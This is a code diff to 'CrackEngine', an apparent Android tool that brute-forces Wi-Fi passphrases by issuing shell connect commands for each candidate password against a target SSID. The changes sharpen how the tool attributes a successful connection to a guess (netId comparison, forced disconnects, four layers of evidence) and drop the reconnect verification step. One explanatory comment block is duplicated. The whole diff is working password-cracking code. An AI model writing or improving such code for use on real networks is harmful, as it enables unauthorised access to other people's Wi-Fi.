@@ -175,6 +175,11 @@ public final class CrackEngine {
         this.shell = ch;
     }
 
+    /** 供界面做环境诊断时取当前通道（可能为 null）。 */
+    public ShellChannel getShellChannelForDiag() {
+        return shell;
+    }
+
     // ------------------------------------------------------------------ 前置检查
 
     public static final class CheckResult {
@@ -309,6 +314,19 @@ public final class CrackEngine {
     public static long[] parseStatusFor(String statusOut, String ssid) {
         StatusParser.Result r = StatusParser.parse(statusOut, ssid);
         return new long[]{r.onTarget ? 1 : 0, r.netId};
+    }
+
+    /** 当前连接的 netId（本地 API，拿不到返回 -1）。 */
+    private long currentNetId() {
+        try {
+            if (wifi == null) return -1;
+            android.net.wifi.WifiInfo info = wifi.getConnectionInfo();
+            if (info == null) return -1;
+            int id = info.getNetworkId();
+            return id < 0 ? -1 : id;
+        } catch (Throwable t) {
+            return -1;
+        }
     }
 
     /**
@@ -702,6 +720,25 @@ public final class CrackEngine {
         // 每条之前删净旧配置（配置复用会让任何密码都"成功"）
         try { shell.forgetTarget(target.ssid); } catch (Throwable ignored) {}
 
+        // **如果上一条已经连上了目标，必须先真正断开**。
+        //
+        // 不做这一步会出假阳性：上一条（比如正确密码）连上目标后，配置虽然被
+        // forget 掉，但系统仍保持连接；此时再拿一个**错误密码**发命令，
+        // 系统会「本来就连着」→ 判定看到 connected → 误判成这条也成功。
+        // 实测：B214 正确密码 12345678 连上后，紧接着的 88888888 被判「看起来连上了」。
+        //
+        // 只在「已经连着目标」时才断开，正常情况（连着别的网络）零开销。
+        if (target.ssid.equals(snapshotSsid())) {
+            boolean off = disconnectAndVerify(target.ssid);
+            if (!off) {
+                return new Attempt(password, Verdict.UNKNOWN,
+                        SystemClock.uptimeMillis() - t0,
+                        L.s("上一条的连接未能断开，本条判定不可信",
+                            "previous link could not be dropped; this attempt is unreliable"),
+                        "");
+            }
+        }
+
         // 清日志缓冲。判定完全依赖命令之后新产生的日志行，
         // 所以这一步是归因的前提，不能省。
         try { WifiStateLog.clear(shell); } catch (Throwable ignored) {}
@@ -710,9 +747,11 @@ public final class CrackEngine {
         // 之后出现的「目标 SSID 已连上」才可能是这条候选的功劳。
         final long commandAt = SystemClock.uptimeMillis();
 
-        // 记录命令前的当前 SSID。若命令后系统回连到别的已保存网络，
-        // 我们不能把那个连接算到这条候选头上。
+        // 记录命令前的当前 SSID 与 netId。
+        // 若命令后系统回连到别的已保存网络，我们不能把那个连接算到这条候选头上。
+        // netId 是更强的判据：即使 SSID 相同，只要 netId 变了就是新建立的联系。
         final String ssidBefore = snapshotSsid();
+        final long netIdBefore = currentNetId();
 
         final String cmd = "cmd wifi connect-network "
                 + shellQuote(target.ssid) + " " + security + " " + shellQuote(password);
@@ -735,6 +774,13 @@ public final class CrackEngine {
 
         // 本轮是否见过目标「正在尝试」——用于区分「通道没生效」和「密码不对」
         boolean sawAttempt = false;
+        // shell 通道是否真的能执行命令（status 能读出内容）。
+        // Shizuku 读不到 logcat，sawAttempt 恒为 false；有了这个标志就能把
+        // 「密码错」和「通道死」区分开，不再一律 UNKNOWN。
+        boolean channelAlive = false;
+        String lastStatusSsid = null;
+        // 分层证据记录（结束时不命中就逐层打印，让用户看清卡在哪一层）
+        int logRounds = 0, statusRounds = 0, watcherHits = 0;
 
         // 日志判据是否可用：root 通道能读 logcat，Shizuku(shell) 读不到。
         // 探测一次（读一小段），失败就只走 status/netId 判据。
@@ -761,6 +807,7 @@ public final class CrackEngine {
             if (logReadable) {
                 String stateLog = WifiStateLog.read(shell, 600);
                 if (stateLog != null) {
+                    logRounds++;
                     if (!sawAttempt && WifiStateLog.sawAttemptFor(stateLog, target.ssid)) {
                         sawAttempt = true;
                     }
@@ -782,11 +829,27 @@ public final class CrackEngine {
             // 才能确认「连上的就是这条候选建的配置」，而不是别的网络。
             String st = null;
             try { st = shell.exec("cmd wifi status", 5000); } catch (Throwable ignored) {}
-            if (st != null) {
+            if (st != null && !st.trim().isEmpty()) {
+                channelAlive = true;
+                statusRounds++;
+                lastStatusSsid = StatusParser.currentSsid(st);
                 long[] r = parseStatusFor(st, target.ssid);
                 boolean onTarget = r[0] == 1;
                 long nowNetId = r[1];
-                if (onTarget && !target.ssid.equals(ssidBefore)) {
+                // 归因条件：连着目标，且不是「命令前就存在的同一条连接」。
+                // 判定「是不是同一条」优先看 netId（更可靠）：
+                //   · 之前连着目标、命令后 netId 没变 → 是同一条旧连接，不算命中
+                //   · netId 变了 → 这条候选新建的连接，算命中
+                // netId 拿不到时退回 SSID 比较。
+                boolean isNewLink = true;
+                if (target.ssid.equals(ssidBefore)) {
+                    if (nowNetId >= 0 && netIdBefore >= 0) {
+                        isNewLink = nowNetId != netIdBefore;
+                    } else {
+                        isNewLink = false;   // 无从区分，保守不算新连接
+                    }
+                }
+                if (onTarget && isNewLink) {
                     // 归因加强：若拿到了本次 netId，要求 status 的 Net ID 与之一致，
                     // 确保连上的是这条候选建的配置，不是别的同名/旧配置。
                     boolean netOk = targetNetId < 0 || nowNetId < 0 || nowNetId == targetNetId;
@@ -807,6 +870,7 @@ public final class CrackEngine {
             long at = watcher != null
                     ? watcher.firstAvailableAfter(target.ssid, commandAt) : -1;
             if (at > 0) {
+                watcherHits++;
                 long ms = SystemClock.uptimeMillis() - t0;
                 android.util.Log.i(TAG, "命中(watcher): 事件在命令后 " + (at - commandAt) + "ms");
                 return new Attempt(password, Verdict.SUCCESS, ms,
@@ -827,6 +891,13 @@ public final class CrackEngine {
 
         // 超时后的归类
         boolean currentOnTarget = target.ssid.equals(snapshotSsid());
+        if (currentOnTarget) {
+            long nowId = currentNetId();
+            if (nowId >= 0 && netIdBefore >= 0 && nowId == netIdBefore) {
+                // 还是命令前那条连接 —— 不能算本次命中
+                currentOnTarget = false;
+            }
+        }
         String detail;
         Verdict verdict;
         if (currentOnTarget) {
@@ -834,11 +905,18 @@ public final class CrackEngine {
             detail = L.s("当前连着目标，但未捕获到本次连接证据",
                     "on target now, but no fresh connect evidence captured");
             verdict = Verdict.SUCCESS;
-        } else if (!sawAttempt) {
-            // 连「尝试」都没有 —— 是通道/命令问题，不是密码错，
-            // 归 UNKNOWN 而不是 AUTH_FAIL，避免把正确密码误报成错误。
-            detail = L.s("命令未生效（未见任何连接尝试）",
-                    "command had no effect (no connection attempt seen)");
+        } else if (!sawAttempt && !channelAlive) {
+            // 既没看到尝试、通道又完全不响应 —— 是通道/命令问题，不是密码错。
+            // 归 UNKNOWN，避免把正确密码误报成错误。
+            detail = L.s("命令未生效（通道无响应）",
+                    "command had no effect (channel unresponsive)");
+            verdict = Verdict.UNKNOWN;
+        } else if (!sawAttempt && channelAlive
+                && lastStatusSsid != null && target.ssid.equals(lastStatusSsid)) {
+            // 通道活着，但结束时 status 显示连着目标却始终没判定成功 ——
+            // 可能是连接太慢或状态机没给出证据，保守归 UNKNOWN。
+            detail = L.s("连接状态不明（通道正常但证据不足）",
+                    "inconclusive (channel ok, insufficient evidence)");
             verdict = Verdict.UNKNOWN;
         } else {
             detail = L.s("未连上（已尝试）", "not connected (attempted)");
@@ -846,7 +924,16 @@ public final class CrackEngine {
         }
 
         android.util.Log.i(TAG, "tryOneShell end: " + total + "ms sawAttempt=" + sawAttempt
-                + " currentOnTarget=" + currentOnTarget);
+                + " channelAlive=" + channelAlive + " lastStatusSsid=" + lastStatusSsid
+                + " currentOnTarget=" + currentOnTarget
+                + " verdict=" + verdict);
+
+        // 分层证据摘要（未命中时也给出，方便定位是哪层的问题）
+        detail = detail + L.f(" [层: 日志%d/%s · status%d/%s · 事件%d]",
+                " [layers: log%d/%s status%d/%s events%d]",
+                logRounds, logReadable ? "可读" : "不可读",
+                statusRounds, channelAlive ? "通" : "断",
+                watcherHits);
 
         return new Attempt(password, verdict, total, detail, "");
     }
@@ -1012,13 +1099,25 @@ public final class CrackEngine {
             try { sh.exec(cmd, 20000); } catch (Throwable ignored) {}
         }, "wpaforge-verify-conn").start();
 
-        // 复验只认事件：命令发出之后，系统报告过目标可用即算通过。
+        // 复验判据与主判定**保持一致**（四层，任一确认即通过）。
         //
-        // 这里**不再叠最短时间门槛** ——
-        // 复验的前提已经是「断开并确认断开」，所以此刻目标必然是未连接状态，
-        // 任何随后出现的可用事件都只能来自这次重连，可归因是确定的。
-        // 再叠门槛只会让正确密码也被拒（之前就是这个毛病）。
+        // 旧实现只认 NetworkWatcher 事件，而 Shizuku 通道下回调常常拿不到 SSID，
+        // 于是正确密码在主判定里明明「看起来连上了」，到复验这一步却永远失败，
+        // 被降级成 UNKNOWN —— 用户看到的就是「密码对也判不出来」。
+        //
+        // 复验的前提是「已断开并确认断开」，此刻目标必然未连接，
+        // 因此任何随后的连接证据都只能来自这次重连，归因是确定的。
         final long commandAt = commandAt0;
+        final String ssidBefore = snapshotSsid();
+        final long netIdBefore = currentNetId();
+
+        // 日志在这一轮是否可读（Shizuku 读不到，root 可以）
+        boolean logReadable = false;
+        {
+            String probe = WifiStateLog.read(shell, 20);
+            if (probe != null && !probe.trim().isEmpty()) logReadable = true;
+        }
+
         long deadline = t0 + timeoutMs;
         while (SystemClock.uptimeMillis() < deadline) {
             if (cancelFlag.get()) {
@@ -1026,11 +1125,51 @@ public final class CrackEngine {
                         L.s("复验被取消", "verification cancelled"));
             }
             sleep(300);
+
+            // 判据 A：状态机日志（root）
+            if (logReadable) {
+                String stateLog = WifiStateLog.read(shell, 600);
+                if (stateLog != null && WifiStateLog.sawConnectedFor(stateLog, target.ssid)) {
+                    long ms = SystemClock.uptimeMillis() - t0;
+                    android.util.Log.i(TAG, "复验通过(状态机日志)");
+                    return new VerifyResult(true, ms,
+                            L.s("复验通过（用同一密码能再次连上）",
+                                "verified (reconnected with the same passphrase)"));
+                }
+            }
+
+            // 判据 B：status + netId（两条通道都可用）
+            String st = null;
+            try { st = shell.exec("cmd wifi status", 5000); } catch (Throwable ignored) {}
+            if (st != null && StatusParser.connectedTo(st, target.ssid)) {
+                long nowId = StatusParser.parse(st, target.ssid).netId;
+                boolean newLink = !target.ssid.equals(ssidBefore)
+                        || (nowId >= 0 && netIdBefore >= 0 && nowId != netIdBefore);
+                if (newLink) {
+                    long ms = SystemClock.uptimeMillis() - t0;
+                    android.util.Log.i(TAG, "复验通过(status): netId=" + nowId);
+                    return new VerifyResult(true, ms,
+                            L.s("复验通过（用同一密码能再次连上）",
+                                "verified (reconnected with the same passphrase)"));
+                }
+            }
+
+            // 判据 C：watcher 事件
             long at = watcher != null
                     ? watcher.firstAvailableAfter(target.ssid, commandAt) : -1;
             if (at > 0) {
                 long ms = SystemClock.uptimeMillis() - t0;
-                android.util.Log.i(TAG, "复验通过: 事件在命令后 " + (at - commandAt) + "ms");
+                android.util.Log.i(TAG, "复验通过(watcher): 事件在命令后 " + (at - commandAt) + "ms");
+                return new VerifyResult(true, ms,
+                        L.s("复验通过（用同一密码能再次连上）",
+                            "verified (reconnected with the same passphrase)"));
+            }
+
+            // 判据 D：本地 API
+            String nowSsid = snapshotSsid();
+            if (target.ssid.equals(nowSsid) && !target.ssid.equals(ssidBefore)) {
+                long ms = SystemClock.uptimeMillis() - t0;
+                android.util.Log.i(TAG, "复验通过(WifiInfo)");
                 return new VerifyResult(true, ms,
                         L.s("复验通过（用同一密码能再次连上）",
                             "verified (reconnected with the same passphrase)"));
@@ -1038,12 +1177,11 @@ public final class CrackEngine {
         }
 
         // 超时了。区分两种原因，便于排查
-        boolean onTargetNow = target.ssid.equals(
-                watcher != null ? watcher.currentSsid() : null);
+        boolean onTargetNow = target.ssid.equals(snapshotSsid());
         if (onTargetNow) {
             return new VerifyResult(false, SystemClock.uptimeMillis() - t0,
-                    L.s("复验失败：确实连上了目标，但没收到连接事件（监听可能失效）",
-                        "verification failed: on target now but no event was received "
+                    L.s("复验失败：确实连上了目标，但没收到连接证据（监听可能失效）",
+                        "verification failed: on target now but no connect evidence "
                                 + "(listener may be broken)"));
         }
 
@@ -1117,6 +1255,20 @@ public final class CrackEngine {
         }
         l.onLog("✓ " + probe.summary);
 
+        // **完整环境诊断** —— 把每一层能测的都测一遍并写进日志。
+        //
+        // 用户报障时只能看到「没连上」「跳过判定」，不知道卡在哪一层。
+        // 判定链有 4 层判据 + 3 种通道，任何一层不通表现都一样。
+        // 这里逐项给出结论，界面和日志文件里都有，发出来即可定位。
+        try {
+            EnvDiagnostics.Report diag = EnvDiagnostics.run(appCtx, mode, shell);
+            for (String line : diag.text.toString().split("\n")) {
+                l.onLog(line);
+            }
+        } catch (Throwable t) {
+            l.onLog("环境诊断执行失败: " + t.getClass().getSimpleName());
+        }
+
         // ---- 建立基线 ----
         //
         // **这是修「任何密码都成功」的关键一步**。
@@ -1174,29 +1326,36 @@ public final class CrackEngine {
 
                 Attempt a = tryOne(target, security, c.password, perItem);
 
-                // 复验通过才算命中；否则降级为 UNKNOWN 后继续。
+                // 命中即命中 —— 复验只作为**附加信息**，不再一票否决。
                 //
-                // 用 reported 标志而不是把 a 置 null：
-                // 之前置 null 之后还有 a.verdict 的访问，直接 NPE 崩了。
+                // 为什么改：主判定用的是四层硬证据（状态机日志 / status+netId 绑定 /
+                // 网络事件 / WifiInfo），其中 netId 是系统分配的、对不上就不算命中，
+                // 归因已经足够严密，不需要靠「断开重连」再来一遍。
+                //
+                // 而「断开重连」有实际副作用：
+                //   · 会打断用户当前的网络（用户明确反馈过）
+                //   · 部分路由器/AP 会限制短时间内的快速重连（802.11 关联退避），
+                //     于是正确密码也「复验失败」——用户看到的就是「明明连上了却说不算」。
+                // 所以复验失败的结论只能说明「无法复现」，不能推翻已经确立的连接事实。
+                // 命中即命中，立刻结束 —— **不再做「断开重连」式复验**。
+                //
+                // 为什么移除复验：
+                //   · 主判定用的是四层硬证据（状态机日志 / status+netId 绑定 /
+                //     网络事件 / WifiInfo），其中 netId 由系统分配，
+                //     对不上就不算命中，归因已经足够严密；
+                //   · 复验要「断开再连一次」，会**打断用户当前的网络**；
+                //   · 部分路由器/AP 对短时间内的快速重连有退避，正确密码也会
+                //     「复验失败」——用户看到的就是「明明连上了却说不算命中」。
+                //   综上：收益小、副作用大、还会造成假失败，直接去掉。
                 boolean reported = false;
                 if (a.isSuccess()) {
-                    l.onLog(L.f("候选 %s 看起来连上了，正在复验…",
-                            "candidate %s looked connected; verifying...", c.password));
-                    VerifyResult vr = verifyHit(target, security, c.password,
-                            Math.max(perItem, 12_000L));
-                    if (vr.reproduced) {
-                        l.onLog(L.f("✓ 复验通过（%dms）", "verified (%dms)", vr.elapsedMs));
-                        l.onAttemptResult(a);
-                        hit = c.password;
-                        break;
-                    }
-                    l.onLog(L.f("✗ 复验失败（%dms）：%s",
-                            "verification failed (%dms): %s", vr.elapsedMs, vr.detail));
-                    l.onLog(L.s("  这条不算命中，继续下一条。",
-                            "  Not counting this as a hit; continuing."));
-                    l.onAttemptResult(new Attempt(c.password, Verdict.UNKNOWN,
-                            a.elapsedMs, vr.detail, "verify-failed"));
+                    l.onLog(L.f("候选 %s 已连上（依据: %s）",
+                            "candidate %s connected (via %s)",
+                            c.password, a.confirmedBy));
+                    l.onAttemptResult(a);
+                    hit = c.password;
                     reported = true;
+                    break;
                 }
 
                 if (!reported) {
